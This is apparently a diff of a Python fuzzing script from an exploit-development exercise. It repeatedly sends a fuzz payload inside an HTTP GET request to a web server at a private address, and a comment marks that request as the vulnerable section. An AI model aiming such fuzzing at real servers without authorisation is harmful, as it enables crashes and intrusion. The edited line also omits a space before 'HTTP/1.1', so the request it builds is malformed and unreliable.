@@ -14,6 +14,6 @@ while True:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connect = s.connect(("192.168.0.5", 80))
     # from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
-    s.send(b"GET " + FUZZ.encode() + b"\r\n\r\n")
+    s.send(b"GET " + FUZZ.encode() + b"HTTP/1.1\r\n\r\n")
     s.recv(1024)
     s.close()
